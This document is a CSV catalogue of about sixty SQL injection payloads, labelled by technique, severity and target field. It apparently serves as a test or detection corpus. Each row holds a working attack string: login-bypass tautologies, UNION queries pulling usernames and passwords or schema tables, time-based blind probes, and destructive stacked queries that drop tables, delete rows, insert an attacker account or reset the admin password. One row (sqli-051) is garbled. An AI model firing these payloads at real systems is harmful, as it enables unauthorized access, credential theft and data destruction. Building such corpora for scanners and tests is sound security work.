id,attack_class,type,severity,context,payload_hash,payload
sqli-001,SQLi,tautology,high,Login form username input,154eec809fb3,' OR '1'='1
sqli-002,SQLi,union,high,Search input field,5a223cf8ec59,"' UNION SELECT username, password FROM users--"
sqli-003,SQLi,blind-time,medium,ID parameter in URL,95a38465d448,'; WAITFOR DELAY '0:0:5'--
sqli-004,SQLi,error-based,medium,User ID input,6b7595444181,"' AND 1=CONVERT(int,@@version)--"
sqli-005,SQLi,boolean-blind,medium,Search field,9f6c1aa0cd11,' AND 1=1--
sqli-006,SQLi,stacked-queries,critical,User input in form,86c75ed9b0e1,'; DROP TABLE users--
sqli-007,SQLi,tautology,high,Login password field,4b44bb36a1db,' OR 1=1--
sqli-008,SQLi,tautology,medium,URL parameter,095137e7d121,0x27 OR 0x31=0x31--
sqli-009,SQLi,blind-time,medium,PostgreSQL ID parameter,e9d7ea913642,'; SELECT pg_sleep(5)--
sqli-010,SQLi,error-based,medium,User input,89e8e6cff870,"' AND 1=CONVERT(int,USER())--"
sqli-011,SQLi,boolean-blind,medium,Search input,0d6123b277df,"' AND SUBSTRING(@@version,1,1)='5'--"
sqli-012,SQLi,tautology,high,Login username,e1702bf91751,' OR 'a'='a
sqli-013,SQLi,tautology,high,Search field,0a7541cb14aa,' OR 1=1-- -
sqli-014,SQLi,tautology,high,Login form,14c89135444f,'//OR//1=1--
sqli-015,SQLi,tautology,medium,User input,af918e8d6fca,' OR CAST('a' AS INT)=CAST('a' AS INT)--
sqli-016,SQLi,blind-time,medium,ID parameter,5bf1895c6a9d,' OR SLEEP(5)--
sqli-017,SQLi,error-based,high,User input,969d35478dcb,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
sqli-018,SQLi,error-based,high,User input,0f98235c482e,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
sqli-019,SQLi,blind-time,medium,ID parameter,64ed90a385fc,'; SELECT pg_sleep(10)--
sqli-020,SQLi,tautology,high,Login form,58286860220d,' OR 1=1#
sqli-021,SQLi,blind-time,medium,Search input,9ba0c16f053a,' OR SLEEP(10)--
sqli-022,SQLi,union,high,Search field,59739c99173f,"' UNION SELECT NULL, NULL, username, password FROM users--"
sqli-023,SQLi,tautology,high,Login username,99419739cd09,' OR 1=1/*
sqli-024,SQLi,boolean-blind,medium,Search input,91133148b21e,' AND (SELECT COUNT(*) FROM users) > 0--
sqli-025,SQLi,blind-time,medium,ID parameter,338195803dcd,' OR pg_sleep(7)--
sqli-026,SQLi,union,high,Search input,e3f8372ba766,"' UNION SELECT database(), NULL--"
sqli-027,SQLi,blind-time,medium,User ID input,7db5a21350c5,'; WAITFOR DELAY '0:0:10'--
sqli-028,SQLi,tautology,medium,Login form,e9b6195b56b6,' OR CAST(1 AS INT)=1--
sqli-029,SQLi,boolean-blind,medium,Search input,2183b013018a,"' OR SUBSTRING(user(),1,1)='r'--"
sqli-030,SQLi,blind-time,medium,User input,a1b644436a33,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--
sqli-031,SQLi,union,high,Search input,7621fe52e869,"' UNION SELECT table_name, NULL FROM information_schema.tables--"
sqli-032,SQLi,blind-time,medium,ID parameter,4c3bf91b7149,' OR (SELECT sleep(5))--
sqli-033,SQLi,tautology,medium,Login username,7359e77635a6,' OR 0x61646d696e=0x61646d696e--
sqli-034,SQLi,blind-time,medium,Search input,75e1e513c95f,' OR SLEEP(5)#
sqli-035,SQLi,union,high,Search input,5e44e42c0301,"' UNION SELECT user(), NULL--"
sqli-036,SQLi,blind-time,medium,ID parameter,6a73908491a5,' OR pg_sleep(3)--
sqli-037,SQLi,blind-time,medium,User ID input,3772a6acdd09,'; WAITFOR DELAY '0:0:3'--
sqli-038,SQLi,boolean-blind,medium,Search input,c299b265a9fa,"' OR SUBSTRING(@@version,1,1)='5'--"
sqli-039,SQLi,blind-time,medium,User input,e69a747f6252,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--
sqli-040,SQLi,stacked-queries,critical,User input,bcbe9ad53e71,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
sqli-041,SQLi,blind-time,medium,Search input,f45cc1448d90,' OR SLEEP(8)/*
sqli-043,SQLi,boolean-blind,medium,Login input,e3a21306714e,"' OR SUBSTRING(user(),1,1)='a'/*"
sqli-044,SQLi,stacked-queries,critical,User input,b9b203237ee9,'; UPDATE users SET password='hacked' WHERE username='admin'--
sqli-045,SQLi,blind-time,medium,ID parameter,826442a651a3,' OR pg_sleep(6)/*
sqli-046,SQLi,union,high,Search input,43562808d09a,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
sqli-047,SQLi,tautology,medium,Login form,c080665a20bf,' OR CAST('1' AS INT)=1--
sqli-048,SQLi,blind-time,medium,User ID input,22b60dd99e75,'; WAITFOR DELAY '0:0:7'/*
sqli-049,SQLi,boolean-blind,medium,Search input,17245738ef77,"' OR SUBSTRING(@@version,1,1)='8'#"
sqli-051,SQLi,blind-time,medium,User input,add6b696e76e,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/
sqli-052,SQLi,stacked-queries,critical,User input,31e08d6ad10c,'; DELETE FROM users WHERE username='guest'--
sqli-053,SQLi,tautology,medium,Login username,077be1698990,' OR 0x31=0x31--
sqli-054,SQLi,blind-time,medium,Search input,171c386f2f0b,' OR SLEEP(9)#
sqli-055,SQLi,union,high,Search input,a9a4dd98eaa6,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
sqli-056,SQLi,blind-time,medium,ID parameter,d4dd7331be31,' OR pg_sleep(4)#
sqli-057,SQLi,tautology,medium,Login form,9cd2eaa7a1f3,' OR CAST(1 AS INT)=1/*
sqli-058,SQLi,boolean-blind,medium,Search input,c4c6dada2c1e,"' OR SUBSTRING(user(),1,1)='b'/*"
sqli-060,SQLi,stacked-queries,critical,User input,01cf98e93780,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
sqli-061,SQLi,blind-time,medium,User ID input,60e88e716850,'; WAITFOR DELAY '0:0:5'#
sqli-062,SQLi,boolean-blind,medium,Search input,a89a2871a8c4,"' OR SUBSTRING(@@version,1,1)='9'#"
sqli-064,SQLi,blind-time,medium,User input,01c147038c7f,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#
sqli-065,SQLi,stacked-queries,critical,User input,ea837cbd618e,'; DROP TABLE sessions--
